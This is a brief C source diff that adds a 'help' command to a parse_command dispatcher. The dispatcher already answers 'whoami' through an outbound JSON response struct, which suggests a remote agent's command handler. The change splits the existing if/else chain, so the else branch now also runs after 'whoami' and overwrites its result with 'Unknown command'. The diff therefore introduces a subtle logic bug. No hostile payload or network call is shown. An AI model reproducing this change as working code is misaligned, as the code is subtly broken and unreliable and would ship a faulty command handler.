@@ -45,7 +45,12 @@ int parse_command(char* command, char* args, OutboundJsonDataStruct* response_st
     if (strcmp(command, "whoami") == 0) {
         DEBUG_LOG("[COMMAND] whoami\n");
         get_username(response_struct);
-    }  else {
+    }  
+    if (strcmp(command, "help") == 0) {
+        DEBUG_LOG("[COMMAND] help\n");
+        set_response_data(response_struct, "Help Menu Placeholder");
+    }
+    else {
         DEBUG_LOG("[COMMAND] Unknown command!\n");
         set_response_data(response_struct, "Unknown command");
     }
